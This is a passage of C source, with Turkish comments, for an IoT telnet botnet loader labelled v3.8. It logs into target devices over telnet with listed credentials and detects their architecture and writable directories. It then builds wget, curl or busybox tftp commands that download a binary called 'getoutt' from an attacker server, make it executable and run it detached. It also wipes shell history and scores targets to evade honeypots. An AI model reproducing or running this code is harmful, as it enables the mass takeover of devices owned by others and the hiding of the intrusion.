            "/usr/lib/libc.so* 2>/dev/null; "
        "echo ARCH_END",
        buf, sizeof(buf), "ARCH_END", CFG_READ_TIMEOUT + 2);

    if (rc > 0) {
        if (hp_has_signature(buf)) {
            if (out_hp) *out_hp = HP_PROMPT;
            return NULL;
        }

        bin = arch_find_bin(buf);
        if (bin && bin_available(bin)) return bin;
    }

    memset(buf, 0, sizeof(buf));
    rc = send_cmd(ctx,
        "ls /lib /usr/lib 2>/dev/null; echo ARCH_END",
        buf, sizeof(buf), "ARCH_END", CFG_READ_TIMEOUT + 2);

    if (rc > 0) {
        if (hp_has_signature(buf)) {
            if (out_hp) *out_hp = HP_PROMPT;
            return NULL;
        }

        bin = arch_find_bin(buf);
        if (bin && bin_available(bin)) return bin;
    }

    return NULL;
}

/* ═══════════════════════════════════════════════════════════
 *  YAZILABİLİR DİZİN TESPİTİ
 * ═══════════════════════════════════════════════════════════ */
static int detect_writedir(RecvCtx *ctx, char *out, size_t outsz)
{
    char buf[1024];
    memset(buf, 0, sizeof(buf));
    send_cmd(ctx,
        "for d in /tmp /var/tmp /dev/shm /mnt /run /var/run /var; do "
        "[ -w \"$d\" ] && echo \"WD:$d\" && break; done",
        buf, sizeof(buf), "WD:", CFG_READ_TIMEOUT);

    char *p = strstr(buf, "WD:");
    if (!p) {
        memset(buf, 0, sizeof(buf));
        send_cmd(ctx,
            "for d in /tmp /var/tmp /dev/shm /mnt /run /var/run /var; do "
            "ls $d >/dev/null 2>&1 && echo \"WD:$d\" && break; done",
            buf, sizeof(buf), "WD:", CFG_READ_TIMEOUT);
        p = strstr(buf, "WD:");
    }
    if (!p) return -1;

    p += 3;
    size_t i = 0;
    while (*p && *p != '\r' && *p != '\n' && *p != ' ' && i < outsz - 1)
        out[i++] = *p++;
    out[i] = '\0';
    return (i > 0) ? 0 : -1;
}

/* ═══════════════════════════════════════════════════════════
 *  İNDİRME ARACI TESPİTİ
 * ═══════════════════════════════════════════════════════════ */
static DlType detect_downloader(RecvCtx *ctx)
{
    char buf[1024];
    memset(buf, 0, sizeof(buf));

    send_cmd(ctx,
        "which wget 2>/dev/null && echo DL_WGET; "
        "which curl 2>/dev/null && echo DL_CURL; "
        "/bin/busybox wget --help >/dev/null 2>&1 && echo DL_BWGET; "
        "/bin/busybox tftp --help >/dev/null 2>&1 && echo DL_BTFTP; "
        "echo DL_END",
        buf, sizeof(buf), "DL_END", CFG_READ_TIMEOUT);

    if (strstr(buf, "DL_WGET"))  return DL_WGET;
    if (strstr(buf, "DL_CURL"))  return DL_CURL;
    if (strstr(buf, "DL_BWGET")) return DL_BUSYBOX_WGET;
    if (strstr(buf, "DL_BTFTP")) return DL_TFTP;
    return DL_NONE;
}

/* ═══════════════════════════════════════════════════════════
 *  İNDİRME + ÇALIŞTIRMA KOMUTU
 *
 *  ⭐ v3.8 formatı:
 *     cd <writedir>; rm -rf getoutt;
 *     wget http://ip:port/bins/<arch> -O getoutt;
 *     chmod 777 getoutt; ./getoutt <arch>;
 *
 *  BusyBox tftp için tftp -g -l getoutt -r bins/<arch> <tftp_ip>
 *  curl için  curl -fsSL -o getoutt ...
 * ═══════════════════════════════════════════════════════════ */
static void build_dl_cmd(DlType dl, const char *binname,
                         const char *arch_arg,
                         const char *writedir,
                         char *out, size_t outsz)
{
    char dst[128];
    snprintf(dst, sizeof(dst), "%s/%s", writedir, CFG_PAYLOAD_NAME);

    switch (dl) {
        case DL_BUSYBOX_WGET:
            snprintf(out, outsz,
                "cd %s; rm -rf %s; "
                "/bin/busybox wget %s/bins/%s -O %s 2>/dev/null; "
                "/bin/busybox chmod 777 %s 2>/dev/null; "
                "./%s %s 2>/dev/null; "
                "echo __DL_END__",
                writedir, CFG_PAYLOAD_NAME,
                CFG_HTTP_SERVER, binname, CFG_PAYLOAD_NAME,
                CFG_PAYLOAD_NAME,
                CFG_PAYLOAD_NAME, arch_arg);
            break;

        case DL_TFTP:
            snprintf(out, outsz,
                "cd %s; rm -rf %s; "
                "/bin/busybox tftp -g -l %s -r bins/%s %s 2>/dev/null; "
                "/bin/busybox chmod 777 %s 2>/dev/null; "
                "./%s %s 2>/dev/null; "
                "echo __DL_END__",
                writedir, CFG_PAYLOAD_NAME,
                CFG_PAYLOAD_NAME, binname, CFG_TFTP_SERVER,
                CFG_PAYLOAD_NAME,
                CFG_PAYLOAD_NAME, arch_arg);
            break;

        case DL_WGET:
            snprintf(out, outsz,
                "cd %s; rm -rf %s; "
                "wget %s/bins/%s -O %s 2>/dev/null; "
                "chmod 777 %s 2>/dev/null; "
                "./%s %s 2>/dev/null; "
                "echo __DL_END__",
                writedir, CFG_PAYLOAD_NAME,
                CFG_HTTP_SERVER, binname, CFG_PAYLOAD_NAME,
                CFG_PAYLOAD_NAME,
                CFG_PAYLOAD_NAME, arch_arg);
            break;

        case DL_CURL:
            snprintf(out, outsz,
                "cd %s; rm -rf %s; "
                "curl -fsSL -o %s %s/bins/%s 2>/dev/null; "
                "chmod 777 %s 2>/dev/null; "
                "./%s %s 2>/dev/null; "
                "echo __DL_END__",
                writedir, CFG_PAYLOAD_NAME,
                CFG_PAYLOAD_NAME, CFG_HTTP_SERVER, binname,
                CFG_PAYLOAD_NAME,
                CFG_PAYLOAD_NAME, arch_arg);
            break;

        default:
            out[0] = '\0';
            break;
    }
}

/* ═══════════════════════════════════════════════════════════
 *  TEMİZLİK
 * ═══════════════════════════════════════════════════════════ */
static void do_cleanup(RecvCtx *ctx, const char *writedir)
{
    char cmds[2048];
    snprintf(cmds, sizeof(cmds),
        "history -c 2>/dev/null; "
        "unset HISTFILE 2>/dev/null; "
        "rm -f /root/.ash_history /root/.bash_history "
               "/root/.sh_history %s/.wget-hsts 2>/dev/null; "
        "echo cleaned",
        writedir);

    char buf[256];
    send_cmd(ctx, cmds, buf, sizeof(buf), "cleaned", 3);
}

/* ═══════════════════════════════════════════════════════════
 *  ARCH ARGÜMANI
 *
 *  getoutt binary'sine komut satırı argümanı olarak
 *  "x86", "x64", "mips", "mpsl", "arm" vs. geçilir.
 * ═══════════════════════════════════════════════════════════ */
static const char *arch_to_arg(const char *binname)
{
    if (!binname) return "unknown";
    if (strstr(binname, "x64"))     return "x64";
    if (strstr(binname, "x86"))     return "x86";
    if (strstr(binname, "mpsl"))    return "mpsl";
    if (strstr(binname, "mps64"))   return "mps64";
    if (strstr(binname, "mips"))    return "mips";
    if (strstr(binname, "arm64"))   return "arm64";
    if (strstr(binname, "arm7"))    return "arm7";
    if (strstr(binname, "arm6"))    return "arm6";
    if (strstr(binname, "arm5"))    return "arm5";
    if (strstr(binname, "arm"))     return "arm";
    if (strstr(binname, "ppc"))     return "ppc";
    if (strstr(binname, "spc"))     return "spc";
    if (strstr(binname, "m68k"))    return "m68k";
    if (strstr(binname, "sh4"))     return "sh4";
    if (strstr(binname, "arc"))     return "arc";
    if (strstr(binname, "riscv64")) return "riscv64";
    if (strstr(binname, "riscv32")) return "riscv32";
    return "unknown";
}

/* ═══════════════════════════════════════════════════════════
 *  WORKER THREAD
 * ═══════════════════════════════════════════════════════════ */
static void *worker(void *arg)
{
    Target *t = (Target *)arg;
    char    buf[8192];
    char    dlcmd[2048];
    char    paypath[160];
    char    extra[512];
    char    writedir[64];
    char    arch_arg[32];
    HpType  hp = HP_NONE;
    int     hp_score = 0;
    int     fake_cred_accepted = 0;

    pthread_mutex_lock(&g_stat_mu);
    g_stat_try++;
    g_stat_active++;
    pthread_mutex_unlock(&g_stat_mu);

    LOG_INF("%s:%d | %s:%s  →  deniyor...",
            t->ip, t->port, t->user, t->pass);

    int suspicious_cred = hp_is_suspicious_cred(t->user, t->pass);

    int fd = tcp_connect(t->ip, t->port, CFG_CONN_TIMEOUT);
    if (fd < 0) {
        LOG_ERR("%s:%d | bağlantı kurulamadı", t->ip, t->port);
        log_append(g_fp_fail, t->ip, t->port,
                   t->user, t->pass, "connect_failed");
        goto done_fail;
    }

    RecvCtx ctx;
    rctx_init(&ctx, fd);

    int login_ok = telnet_login(&ctx, t->user, t->pass, &hp);

    if (!login_ok) {
        close(fd);

        if (hp != HP_NONE) {
            hp_score = hp_calc_score("", t->user, t->pass, 0, suspicious_cred);
            if (hp_score < HP_SCORE_THRESHOLD) hp_score = HP_SCORE_THRESHOLD;

            char hpmsg[160];
            snprintf(hpmsg, sizeof(hpmsg),
                     "honeypot score=%d type=%s (login stage)",
                     hp_score, HP_NAMES[hp]);
            LOG_HP("%s:%d | HONEYPOT (%s, score=%d)",
                   t->ip, t->port, HP_NAMES[hp], hp_score);
            log_append(g_fp_hp, t->ip, t->port,
                       t->user, t->pass, hpmsg);

            pthread_mutex_lock(&g_stat_mu);
            g_stat_hp++;
            pthread_mutex_unlock(&g_stat_mu);

            goto done_hp;
        }

        fake_cred_accepted = hp_fake_cred_test(t->ip, t->port);

        hp_score = hp_calc_score("", t->user, t->pass,
                                 fake_cred_accepted, suspicious_cred);

        if (fake_cred_accepted && hp_score < HP_SCORE_THRESHOLD)
            hp_score = HP_SCORE_THRESHOLD;

        if (hp_score >= HP_SCORE_THRESHOLD) {
            char hpmsg[192];
            snprintf(hpmsg, sizeof(hpmsg),
                     "honeypot score=%d fake_cred=%s suspicious_cred=%s",
                     hp_score,
                     fake_cred_accepted ? "yes" : "no",
                     suspicious_cred ? "yes" : "no");
            LOG_HP("%s:%d | %s:%s  →  HONEYPOT (score=%d, fake_cred=%s)",
                   t->ip, t->port, t->user, t->pass,
                   hp_score, fake_cred_accepted ? "yes" : "no");
            log_append(g_fp_hp, t->ip, t->port,
                       t->user, t->pass, hpmsg);

            pthread_mutex_lock(&g_stat_mu);
            g_stat_hp++;
            pthread_mutex_unlock(&g_stat_mu);

            goto done_hp;
        }

        LOG_ERR("%s:%d | %s:%s  →  login başarısız (gerçek cihaz)",
                t->ip, t->port, t->user, t->pass);
        log_append(g_fp_fail, t->ip, t->port,
                   t->user, t->pass, "login_failed");
        goto done_fail;
    }

    LOG_OK("%s:%d | %s:%s  →  giriş başarılı",
           t->ip, t->port, t->user, t->pass);

    const char *binname = detect_arch(&ctx, &hp);

    if (hp != HP_NONE) {
        hp_score = hp_calc_score("", t->user, t->pass, 0, suspicious_cred);
        if (hp_score < HP_SCORE_THRESHOLD) hp_score = HP_SCORE_THRESHOLD;

        char hpmsg[160];
        snprintf(hpmsg, sizeof(hpmsg),
                 "honeypot score=%d type=%s (arch stage)",
                 hp_score, HP_NAMES[hp]);
        LOG_HP("%s:%d | HONEYPOT (%s, score=%d)",
               t->ip, t->port, HP_NAMES[hp], hp_score);
        log_append(g_fp_hp, t->ip, t->port,
                   t->user, t->pass, hpmsg);

        pthread_mutex_lock(&g_stat_mu);
        g_stat_hp++;
        pthread_mutex_unlock(&g_stat_mu);

        close(fd);
        goto done_hp;
    }

    if (suspicious_cred) {
        int fake = hp_fake_cred_test(t->ip, t->port);
        if (fake) fake_cred_accepted = 1;
        hp_score = hp_calc_score("", t->user, t->pass,
                                 fake_cred_accepted, suspicious_cred);

        if (hp_score >= HP_SCORE_THRESHOLD) {
            char hpmsg[192];
            snprintf(hpmsg, sizeof(hpmsg),
                     "honeypot score=%d fake_cred=%s suspicious_cred=yes",
                     hp_score, fake_cred_accepted ? "yes" : "no");
            LOG_HP("%s:%d | HONEYPOT (score=%d, cred check)",
                   t->ip, t->port, hp_score);
            log_append(g_fp_hp, t->ip, t->port,
                       t->user, t->pass, hpmsg);

            pthread_mutex_lock(&g_stat_mu);
            g_stat_hp++;
            pthread_mutex_unlock(&g_stat_mu);

            close(fd);
            goto done_hp;
        }
    }

    if (!binname) {
        LOG_WRN("%s:%d | mimari tespit edilemedi", t->ip, t->port);
        log_append(g_fp_fail, t->ip, t->port,
                   t->user, t->pass, "arch_unknown");
        close(fd);
        goto done_fail;
    }
    LOG_OK("%s:%d | mimari → %s", t->ip, t->port, binname);

    if (detect_writedir(&ctx, writedir, sizeof(writedir)) < 0) {
        LOG_WRN("%s:%d | yazılabilir dizin bulunamadı", t->ip, t->port);
        log_append(g_fp_fail, t->ip, t->port,
                   t->user, t->pass, "no_writeable_dir");
        close(fd);
        goto done_fail;
    }
    LOG_OK("%s:%d | dizin → %s", t->ip, t->port, writedir);

    DlType dl = detect_downloader(&ctx);
    if (dl == DL_NONE) {
        LOG_WRN("%s:%d | indirme aracı bulunamadı", t->ip, t->port);
        log_append(g_fp_fail, t->ip, t->port,
                   t->user, t->pass, "no_downloader");
        close(fd);
        goto done_fail;
    }
    LOG_OK("%s:%d | indirici → %s", t->ip, t->port, DL_NAMES[dl]);

    /* ⭐ arch argümanını hesapla: x86 / x64 / mips / mpsl ... */
    snprintf(arch_arg, sizeof(arch_arg), "%s", arch_to_arg(binname));

    build_dl_cmd(dl, binname, arch_arg, writedir, dlcmd, sizeof(dlcmd));
    snprintf(paypath, sizeof(paypath), "%s/%s", writedir, CFG_PAYLOAD_NAME);

    LOG_INF("%s:%d | indiriliyor → %s", t->ip, t->port, dlcmd);
    memset(buf, 0, sizeof(buf));
    send_cmd(&ctx, dlcmd, buf, sizeof(buf), "__DL_END__", CFG_DL_TIMEOUT);

    char vfy[256];
    snprintf(vfy, sizeof(vfy),
             "test -s %s && echo __OK__ || echo __FAIL__", paypath);
    memset(buf, 0, sizeof(buf));
    send_cmd(&ctx, vfy, buf, sizeof(buf), "__", CFG_READ_TIMEOUT);

    if (!strstr(buf, "__OK__")) {
        LOG_ERR("%s:%d | indirme başarısız (dosya yok)", t->ip, t->port);
        log_append(g_fp_fail, t->ip, t->port,
                   t->user, t->pass, "download_failed");
        close(fd);
        goto done_fail;
    }
    LOG_OK("%s:%d | indirme tamamlandı → %s", t->ip, t->port, paypath);

    /* Payload'u detached başlat (inşa komutundan sonra ekstra güvence) */
    char exec_chain[1024];
    snprintf(exec_chain, sizeof(exec_chain),
             "cd %s 2>/dev/null; "
             "( setsid ./%s %s </dev/null >/dev/null 2>&1 & ) "
             "|| "
             "( nohup ./%s %s </dev/null >/dev/null 2>&1 & ) "
             "|| "
             "( ./%s %s </dev/null >/dev/null 2>&1 & ) ; "
             "echo __EXECUTED__",
             writedir,
             CFG_PAYLOAD_NAME, arch_arg,
             CFG_PAYLOAD_NAME, arch_arg,
             CFG_PAYLOAD_NAME, arch_arg);

    char exec_resp[256];
    memset(exec_resp, 0, sizeof(exec_resp));
    send_cmd(&ctx, exec_chain, exec_resp, sizeof(exec_resp),
             "__EXECUTED__", 5);
    usleep(300000);
    LOG_OK("%s:%d | payload başlatıldı (detached) → %s/%s %s",
           t->ip, t->port, writedir, CFG_PAYLOAD_NAME, arch_arg);

    do_cleanup(&ctx, writedir);

    snprintf(extra, sizeof(extra),
             "arch=%s dir=%s dl=%s payload=%s/%s arg=%s",
             binname, writedir, DL_NAMES[dl],
             writedir, CFG_PAYLOAD_NAME, arch_arg);
    log_append(g_fp_success, t->ip, t->port,
               t->user, t->pass, extra);

    pthread_mutex_lock(&g_stat_mu);
    g_stat_ok++;
    pthread_mutex_unlock(&g_stat_mu);

    cprint(COL_MAG, "★★★ ",
           "BAŞARILI  %s:%d  %s:%s  [%s]",
           t->ip, t->port, t->user, t->pass, binname);

    close(fd);
    goto done;

done_hp:
    goto done;

done_fail:
    pthread_mutex_lock(&g_stat_mu);
    g_stat_fail++;
    pthread_mutex_unlock(&g_stat_mu);

done:
    pthread_mutex_lock(&g_stat_mu);
    g_stat_active--;
    pthread_mutex_unlock(&g_stat_mu);

    sem_post(&g_sem);
    return NULL;
}

/* ═══════════════════════════════════════════════════════════
 *  REAL-TIME İSTATİSTİK
 * ═══════════════════════════════════════════════════════════ */
static void *stat_thread(void *arg)
{
    (void)arg;
    while (!g_stop) {
        for (int i = 0; i < 5 && !g_stop; i++) sleep(1);
        if (g_stop) break;

        time_t elapsed = time(NULL) - g_start_time;
        long ok, fail, active, tried, hp;

        pthread_mutex_lock(&g_stat_mu);
        ok     = g_stat_ok;
        fail   = g_stat_fail;
        active = g_stat_active;
        tried  = g_stat_try;
        hp     = g_stat_hp;
        pthread_mutex_unlock(&g_stat_mu);

        double rate = elapsed > 0 ? (double)tried / elapsed : 0;

        pthread_mutex_lock(&g_print_mu);
        printf(COL_WHT
               "[STAT] Denenen:%-6ld  "
               COL_GRN "OK:%-5ld  "
               COL_RED "FAIL:%-6ld  "
               COL_MAG "HP:%-4ld  "
               COL_CYN "Aktif:%-4ld  "
               COL_YEL "%.1f/sn  "
               COL_GRY "%ldsn"
               COL_RST "\n",
               tried, ok, fail, hp, active, rate, (long)elapsed);
        fflush(stdout);
        pthread_mutex_unlock(&g_print_mu);
    }
    return NULL;
}

/* ═══════════════════════════════════════════════════════════
 *  SIGINT / SIGTERM
 * ═══════════════════════════════════════════════════════════ */
static void sig_handler(int sig)
{
    (void)sig;
    g_stop = 1;
    write(STDOUT_FILENO, "\n[!] Durduruluyor...\n", 20);
}

/* ═══════════════════════════════════════════════════════════
 *  HEDEF LİSTESİ
 * ═══════════════════════════════════════════════════════════ */
static int load_targets(const char *path)
{
    FILE *f = fopen(path, "r");
    if (!f) {
        fprintf(stderr, COL_RED "[!] %s açılamadı: %s\n" COL_RST,
                path, strerror(errno));
        return -1;
    }

    g_targets = calloc(CFG_MAX_TARGETS, sizeof(Target));
    if (!g_targets) { fclose(f); return -1; }

    char line[256];
    int  cnt = 0;

    while (cnt < CFG_MAX_TARGETS && fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\r\n")] = '\0';
        if (!line[0] || line[0] == '#') continue;

        char *ip   = line;
        char *port = strchr(ip, ':');
        if (!port) continue;
        *port++ = '\0';

        char *user = strchr(port, ':');
        if (!user) continue;
        *user++ = '\0';

        char *pass = strchr(user, ':');
        if (!pass) continue;
        *pass++ = '\0';

        int p = atoi(port);
        if (p <= 0 || p > 65535) continue;
        if (!ip[0]) continue;

        Target *tgt = &g_targets[cnt];
        strncpy(tgt->ip,   ip,   sizeof(tgt->ip)   - 1);
        tgt->ip[sizeof(tgt->ip) - 1] = '\0';
        tgt->port = p;
        strncpy(tgt->user, user, sizeof(tgt->user) - 1);
        tgt->user[sizeof(tgt->user) - 1] = '\0';
        strncpy(tgt->pass, pass, sizeof(tgt->pass) - 1);
        tgt->pass[sizeof(tgt->pass) - 1] = '\0';

        cnt++;
    }
    fclose(f);
    return cnt;
}

/* ═══════════════════════════════════════════════════════════
 *  ÖZET RAPOR
 * ═══════════════════════════════════════════════════════════ */
static void print_summary(void)
{
    time_t elapsed = time(NULL) - g_start_time;
    printf("\n");
    printf(COL_WHT "╔══════════════════════════════════════╗\n" COL_RST);
    printf(COL_WHT "║           SONUÇ RAPORU               ║\n" COL_RST);
    printf(COL_WHT "╠══════════════════════════════════════╣\n" COL_RST);
    printf(COL_WHT "║ " COL_GRN "Başarılı : %-27ld" COL_WHT "║\n" COL_RST, g_stat_ok);
    printf(COL_WHT "║ " COL_RED "Başarısız: %-27ld" COL_WHT "║\n" COL_RST, g_stat_fail);
    printf(COL_WHT "║ " COL_MAG "Honeypot : %-27ld" COL_WHT "║\n" COL_RST, g_stat_hp);
    printf(COL_WHT "║ " COL_CYN "Toplam   : %-27ld" COL_WHT "║\n" COL_RST, g_stat_try);
    printf(COL_WHT "║ " COL_YEL "Süre     : %-24ldsn " COL_WHT "║\n" COL_RST, (long)elapsed);
    printf(COL_WHT "╠══════════════════════════════════════╣\n" COL_RST);
    printf(COL_WHT "║ " COL_GRN "Başarı Log: %-26s" COL_WHT "║\n" COL_RST, CFG_SUCCESS_LOG);
    printf(COL_WHT "║ " COL_RED "Fail   Log: %-26s" COL_WHT "║\n" COL_RST, CFG_FAIL_LOG);
    printf(COL_WHT "║ " COL_MAG "Honeypot  : %-26s" COL_WHT "║\n" COL_RST, CFG_HONEYPOT_LOG);
    printf(COL_WHT "╚══════════════════════════════════════╝\n\n" COL_RST);
}

/* ═══════════════════════════════════════════════════════════
 *  MAIN
 * ═══════════════════════════════════════════════════════════ */
int main(int argc, char *argv[])
{
    const char *listfile    = (argc > 1) ? argv[1] : CFG_IP_LIST;
    int         max_threads = (argc > 2) ? atoi(argv[2]) : CFG_MAX_THREADS;

    if (max_threads < 1)    max_threads = 1;
    if (max_threads > 1000) max_threads = 1000;

    signal(SIGINT,  sig_handler);
    signal(SIGTERM, sig_handler);
    signal(SIGPIPE, SIG_IGN);

    g_start_time = time(NULL);

    log_open_files();

    printf(COL_CYN "[*] HTTP sunucudan binary listesi çekiliyor: %s%s\n" COL_RST,
           CFG_HTTP_SERVER, CFG_HTTP_LIST_PATH);

    if (fetch_available_bins() < 0) {
        fprintf(stderr, COL_RED
                "[!] Binary listesi alınamadı!\n"
                "    HTTP sunucu çalışıyor mu?  %s\n"
                "    Endpoint doğru mu?         %s%s\n" COL_RST,
                CFG_HTTP_SERVER, CFG_HTTP_SERVER, CFG_HTTP_LIST_PATH);
        log_close_files();
        return 1;
    }

    printf(COL_CYN
           "╔══════════════════════════════════════════════╗\n"
           "║  IoT Telnet Loader  v3.8  Pro + Honeypot     ║\n"
           "╠══════════════════════════════════════════════╣\n"
           "║ Liste    : %-33s║\n"
           "║ Threads  : %-33d║\n"
           "║ Sunucu   : %-33s║\n"
           "║ List API : %-33s║\n"
           "║ Payload  : %-33s║\n"
           "║ Binary   : %-33d║\n"
           "╚══════════════════════════════════════════════╝\n\n"
           COL_RST,
           listfile, max_threads,
           CFG_HTTP_SERVER, CFG_HTTP_LIST_PATH,
           CFG_PAYLOAD_NAME,
           g_available_count);

    int n = load_targets(listfile);
    if (n <= 0) {
        fprintf(stderr, COL_RED "[!] Hedef bulunamadı: %s\n" COL_RST, listfile);
        log_close_files();
        return 1;
    }
    g_total = n;
    printf(COL_GRN "[*] %d hedef yüklendi.\n\n" COL_RST, n);

    sem_init(&g_sem, 0, (unsigned int)max_threads);

    pthread_t stat_tid;
    pthread_create(&stat_tid, NULL, stat_thread, NULL);
    pthread_detach(stat_tid);

    for (int i = 0; i < n && !g_stop; i++) {
        sem_wait(&g_sem);
        if (g_stop) { sem_post(&g_sem); break; }

        pthread_t tid;
        if (pthread_create(&tid, NULL, worker, &g_targets[i]) != 0) {
            sem_post(&g_sem);
            continue;
        }
        pthread_detach(tid);
    }

    for (int i = 0; i < max_threads; i++) sem_wait(&g_sem);

    g_stop = 1;
    sem_destroy(&g_sem);
    free(g_targets);

    print_summary();
    log_close_files();
    return 0;
}